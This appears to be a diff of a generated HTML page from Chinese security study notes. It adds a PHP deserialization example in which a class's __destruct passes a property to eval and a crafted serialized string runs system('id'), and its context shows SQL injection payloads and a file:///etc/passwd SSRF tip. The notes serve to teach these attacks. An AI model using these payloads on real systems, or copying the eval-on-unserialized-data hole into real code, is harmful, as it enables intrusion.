@@ -2946,6 +2946,13 @@
 </li>
       
         <li class="md-nav__item">
+  <a href="#_1" title="反序列化" class="md-nav__link">
+    反序列化
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#sql" title="SQL注入" class="md-nav__link">
     SQL注入
   </a>
@@ -2954,7 +2961,7 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#_1" title="注释" class="md-nav__link">
+  <a href="#_2" title="注释" class="md-nav__link">
     注释
   </a>
   
@@ -2968,7 +2975,7 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#_2" title="框架" class="md-nav__link">
+  <a href="#_3" title="框架" class="md-nav__link">
     框架
   </a>
   
@@ -3027,7 +3034,7 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#_3" title="命令注入" class="md-nav__link">
+  <a href="#_4" title="命令注入" class="md-nav__link">
     命令注入
   </a>
   
@@ -3580,6 +3587,13 @@
 </li>
       
         <li class="md-nav__item">
+  <a href="#_1" title="反序列化" class="md-nav__link">
+    反序列化
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#sql" title="SQL注入" class="md-nav__link">
     SQL注入
   </a>
@@ -3588,7 +3602,7 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#_1" title="注释" class="md-nav__link">
+  <a href="#_2" title="注释" class="md-nav__link">
     注释
   </a>
   
@@ -3602,7 +3616,7 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#_2" title="框架" class="md-nav__link">
+  <a href="#_3" title="框架" class="md-nav__link">
     框架
   </a>
   
@@ -3661,7 +3675,7 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#_3" title="命令注入" class="md-nav__link">
+  <a href="#_4" title="命令注入" class="md-nav__link">
     命令注入
   </a>
   
@@ -3849,8 +3863,73 @@
 <li>请求非http协议, 读取本地文件, 如: <code>file:///etc/passwd</code>。</li>
 <li>间接获取内置帐号token。</li>
 </ol>
+<h2 id="_1">反序列化<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="c1">// 定义类</span>
+<span class="k">class</span> <span class="nc">Cl</span><span class="p">{</span>
+    <span class="k">var</span> <span class="nv">$test</span> <span class="o">=</span> <span class="s2">&quot;hello&quot;</span><span class="p">;</span>
+    <span class="k">var</span> <span class="nv">$age</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
+
+    <span class="c1">// magic函数会被自动调用</span>
+    <span class="c1">// 命名是以符号开头的，比如 __construct, __destruct, __toString, __sleep, __wakeup</span>
+    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
+        <span class="c1">// 序列化调用一次, 反序列化调用一次</span>
+        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span><span class="p">;</span>
+        <span class="c1">// 注入点</span>
+        <span class="k">eval</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$this-&gt;test</span><span class="s2">&quot;</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="nv">$c</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Cl</span><span class="p">();</span>
+<span class="c1">// 序列化</span>
+<span class="nv">$sc</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
+<span class="c1">// object:类名长度:类名:属性数量:{s属性类型字符串:属性名称;s属性类型字符串:属性值;s属性类型字符串:属性名称;i属性类型整型:属性值}</span>
+<span class="c1">// O:1:&quot;C&quot;:1:{s:4:&quot;test&quot;;s:5:&quot;hello&quot;;}</span>
+<span class="c1">// O:2:&quot;Cl&quot;:1:{s:4:&quot;test&quot;;s:5:&quot;hello&quot;;}</span>
+<span class="c1">// O:2:&quot;Cl&quot;:2:{s:4:&quot;test&quot;;s:5:&quot;hello&quot;;s:3:&quot;age&quot;;i:3;}</span>
+<span class="nb">print_r</span><span class="p">(</span><span class="nv">$sc</span><span class="p">);</span>
+<span class="k">echo</span> <span class="s2">&quot;&lt;br&gt;&quot;</span><span class="p">;</span>
+<span class="c1">// 反序列化</span>
+<span class="nv">$sc</span> <span class="o">=</span> <span class="s1">&#39;O:2:&quot;Cl&quot;:2:{s:4:&quot;test&quot;;s:13:&quot;system(\&#39;id\&#39;);&quot;;s:3:&quot;age&quot;;i:3;}&#39;</span><span class="p">;</span>
+<span class="c1">// uid=1(daemon) gid=1(daemon) groups=1(daemon)</span>
+<span class="nv">$uc</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$sc</span><span class="p">);</span>
+<span class="c1">// hello</span>
+<span class="nb">print_r</span><span class="p">(</span><span class="nv">$uc</span><span class="o">-&gt;</span><span class="na">test</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+</td></tr></table>
+
 <h2 id="sql">SQL注入<a class="headerlink" href="#sql" title="Permanent link">&para;</a></h2>
-<h3 id="_1">注释<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h3>
+<h3 id="_2">注释<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
 <ul>
 <li>通用单行注释: <code>--</code>, <mark class="critic">注意后面跟一个空格</mark>, 如<code>flag' or 1=1 --</code></li>
 <li>通用多行注释: <code>/* ... */</code></li>
@@ -3863,7 +3942,7 @@
 <li>猜解数据库名, 表名<code>flag' and exist(select * from xxx) #</code>或<code>' and 0 union select 1,TABLE_SCHEMA,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS #</code>, 使用<code>and 0</code>先将干扰数据清零, 再查询<code>INFORMATION_SCHEMA</code>库中的<code>COLUMNS</code>表获取数据库名和表名</li>
 <li>猜解列名, 数据类型<code>flag' and exist(select xxx from xxx) #</code>或<code>' and 0 union select 1,column_name,data_type from information_schema.columns where table_name='xxx'#</code></li>
 </ul>
-<h3 id="_2">框架<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
+<h3 id="_3">框架<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
 <h4 id="jdbc">JDBC<a class="headerlink" href="#jdbc" title="Permanent link">&para;</a></h4>
 <div class="superfences-tabs">
 <input name="__tabs_1" type="radio" id="__tab_1_0" checked="checked" />
@@ -4087,7 +4166,7 @@
 <p>略</p>
 <details class="quote" open="open"><summary>参考链接</summary><p><a href="https://mp.weixin.qq.com/s/hdOnO-tSGkQp0Wq3wcsIkw">彻底干掉恶心的 SQL 注入漏洞， 一网打尽！</a></p>
 </details>
-<h2 id="_3">命令注入<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h2 id="_4">命令注入<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
 <h3 id="python">Python格式化字符串漏洞<a class="headerlink" href="#python" title="Permanent link">&para;</a></h3>
 <p>参见: <a href="../../coding/python/0x01_datatype/#_3">格式化字符串</a></p>
 <h2 id="dos">DoS<a class="headerlink" href="#dos" title="Permanent link">&para;</a></h2>
